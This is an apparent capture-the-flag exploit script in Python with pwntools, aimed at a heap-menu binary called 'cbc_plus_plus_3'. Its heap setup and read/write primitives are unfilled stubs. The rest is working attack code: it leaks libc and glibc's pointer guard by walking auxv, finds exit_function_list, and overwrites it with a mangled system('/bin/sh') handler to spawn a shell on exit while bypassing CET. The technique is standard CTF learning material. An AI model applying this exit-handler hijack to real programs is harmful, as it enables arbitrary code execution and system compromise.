#!/usr/bin/env python3
from pwn import *

# =============================================================================
# Setup & Config
# =============================================================================
elf = context.binary = ELF('./cbc_plus_plus_3', checksec=False)
libc = ELF('./libc.so.6', checksec=False) 
context.terminal = ['tmux', 'splitw', '-h']

# Change to remote() when you are ready to hit the server
io = process('./cbc_plus_plus_3') 

# =============================================================================
# Challenge Interaction Wrappers
# =============================================================================
def new_zzz(length, data):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Length: ", str(length).encode())
    io.sendafter(b"Data: ", data) # Use sendafter to avoid adding newlines to your data

def new_std(data):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Data: ", data)

def move_zzz_to_std():
    io.sendlineafter(b"> ", b"3")

def print_strings():
    io.sendlineafter(b"> ", b"5")

def exit_prog():
    io.sendlineafter(b"> ", b"6")

# =============================================================================
# Core Primitives (PASTE YOUR CODE HERE)
# =============================================================================
def setup_heap_primitive():
    """
    TODO: Paste your House of Spirit initialization here!
    This should set up the heap so you can freely forge the std::string.
    """
    log.info("Setting up House of Spirit...")
    # new_zzz(...)
    # new_std(...)
    # move_zzz_to_std(...)
    pass

def arb_read(addr, size=8):
    """
    TODO: Paste your logic to read from `addr`.
    1. Forge std::string data pointer to `addr`
    2. print_strings()
    3. Return the leaked bytes
    """
    # ... your forging logic ...
    # print_strings()
    # io.recvuntil(b"std string: ")
    # leaked_data = io.recv(size)
    # return leaked_data
    
    # REMOVE THIS RAISE ONCE IMPLEMENTED
    raise NotImplementedError("You need to paste your arb_read logic here!")

def write_cstr(addr, data):
    """
    TODO: Paste your logic to write a C-string to `addr`.
    1. Forge std::string data pointer to `addr`
    2. new_zzz(..., data)
    3. move_zzz_to_std()
    """
    # ... your forging logic ...
    
    # REMOVE THIS RAISE ONCE IMPLEMENTED
    raise NotImplementedError("You need to paste your write_cstr logic here!")

# =============================================================================
# Advanced Arbitrary Write (Handles NUL bytes automatically)
# =============================================================================
def arb_write(addr, data):
    """
    Safely writes arbitrary data, splitting writes on NUL bytes.
    Because Option 3 (`*s_str = z_str.data`) operates on C-strings, it 
    stops copying at a NUL byte. This function bypasses that limitation 
    by writing chunks and utilizing the trailing NUL byte.
    """
    i = 0
    while i < len(data):
        if data[i] == 0:
            # Write a single NUL byte by assigning an empty string
            write_cstr(addr + i, b"") 
            i += 1
            continue

        j = i
        while j < len(data) and data[j] != 0:
            j += 1

        # Write the contiguous non-NUL chunk
        write_cstr(addr + i, data[i:j])
        i = j

# =============================================================================
# CET / Exit Handler Bypass Logic
# =============================================================================
def ptr_mangle(ptr, guard):
    """Replicates glibc's PTR_MANGLE macro for x86_64"""
    return rol(ptr ^ guard, 0x11, 64)

def leak_ptr_guard(environ_addr):
    """Walks the stack from environ to auxv to leak AT_RANDOM -> pointer_guard"""
    log.info(f"Walking stack from environ ({hex(environ_addr)}) to find AT_RANDOM...")
    
    # Get the stack pointer where envp is stored
    envp_leak = arb_read(environ_addr, 8)
    envp = u64(envp_leak.ljust(8, b'\x00'))
    
    # 1. Skip environment variables to find the NULL terminator
    p = envp
    for _ in range(0x400):
        val = u64(arb_read(p, 8).ljust(8, b'\x00'))
        if val == 0:
            break
        p += 8
    else:
        log.error("Failed to find envp terminator")

    # 2. Parse auxv (comes immediately after envp NULL terminator)
    p += 8
    AT_RANDOM = 25
    
    for _ in range(0x80):
        typ = u64(arb_read(p, 8).ljust(8, b'\x00'))
        val = u64(arb_read(p + 8, 8).ljust(8, b'\x00'))
        
        if typ == AT_RANDOM:
            # AT_RANDOM points to 16 bytes. Bytes 8-15 are the pointer guard.
            pointer_guard = u64(arb_read(val + 8, 8).ljust(8, b'\x00'))
            log.success(f"Leaked pointer_guard: {hex(pointer_guard)}")
            return pointer_guard
            
        if typ == 0: # AT_NULL (end of auxv)
            break
        p += 16
        
    log.error("Failed to find AT_RANDOM in auxv")

def find_exit_function_list(libc_base):
    """Finds glibc's initial exit_function_list in writable segments"""
    log.info("Hunting for exit_function_list...")
    
    eh = arb_read(libc_base, 0x40)
    e_phoff = u64(eh[0x20:0x28])
    e_phentsize = u16(eh[0x36:0x38])
    e_phnum = u16(eh[0x38:0x3a])
    
    ph = arb_read(libc_base + e_phoff, e_phentsize * e_phnum)
    PT_LOAD = 1
    PF_W = 2
    
    for i in range(e_phnum):
        ent = ph[i * e_phentsize:(i + 1) * e_phentsize]
        p_type = u32(ent[0x00:0x04])
        p_flags = u32(ent[0x04:0x08])
        p_vaddr = u64(ent[0x10:0x18])
        p_memsz = u64(ent[0x28:0x30])
        
        if p_type == PT_LOAD and (p_flags & PF_W):
            segment_start = libc_base + p_vaddr
            # Dump segment to scan
            blob = arb_read(segment_start, p_memsz) 
            
            for off in range(0, len(blob) - 0x90, 8):
                q0 = u64(blob[off:off+8])       # next
                q1 = u64(blob[off+8:off+16])    # idx
                q2 = u64(blob[off+16:off+24])   # fns[0].flavor
                q3 = u64(blob[off+24:off+32])   # fns[0].fn
                
                if q0 != 0: continue
                if not (1 <= q1 <= 32): continue 
                if q2 != 4: continue             # 4 == ef_cxa
                if q3 == 0: continue             
                
                valid = True
                for j in range(min(q1, 4)):
                    fl = u64(blob[off + 0x10 + j*0x20 : off + 0x18 + j*0x20])
                    if fl > 4:
                        valid = False
                        break
                
                if valid:
                    target = segment_start + off
                    log.success(f"Found exit_function_list at: {hex(target)}")
                    return target

    log.error("Could not locate exit_function_list")

# =============================================================================
# Main Exploit Flow
# =============================================================================
def exploit():
    # 1. Trigger House of Spirit
    setup_heap_primitive()
    
    # 2. Leak Libc
    log.info("Leaking libc...")
    libc_leak = u64(arb_read(elf.got['__libc_start_main'], 8).ljust(8, b'\x00'))
    libc.address = libc_leak - libc.sym['__libc_start_main']
    log.success(f"Libc base: {hex(libc.address)}")
    
    environ_addr = libc.sym['environ']
    system_addr = libc.sym['system']
    
    # 3. Leak Pointer Guard from Stack
    ptr_guard = leak_ptr_guard(environ_addr)
    
    # 4. Find the exit_function_list in libc
    exit_list_addr = find_exit_function_list(libc.address)
    
    # 5. Write "/bin/sh\x00" to a safe location in .bss
    binsh_addr = elf.bss(0x100) 
    arb_write(binsh_addr, b"/bin/sh\x00")
    log.success(f"Wrote '/bin/sh' to {hex(binsh_addr)}")
    
    # 6. Forge the exit_function_list structure
    mangled_system = ptr_mangle(system_addr, ptr_guard)
    
    fake_exit_list = flat(
        0,              # next
        1,              # idx (Set to 1 so it executes fns[0] immediately)
        4,              # fns[0].flavor = ef_cxa
        mangled_system, # fns[0].fn
        binsh_addr,     # fns[0].arg (This goes into RDI)
        0,              # fns[0].dso_handle
        0               # padding / safe terminator
    )
    
    log.info("Overwriting exit_function_list...")
    arb_write(exit_list_addr, fake_exit_list)
    
    # 7. Trigger normal exit, bypassing CET!
    log.info("Triggering exit() to pop shell...")
    exit_prog()
    
    io.interactive()

if __name__ == "__main__":
    exploit()
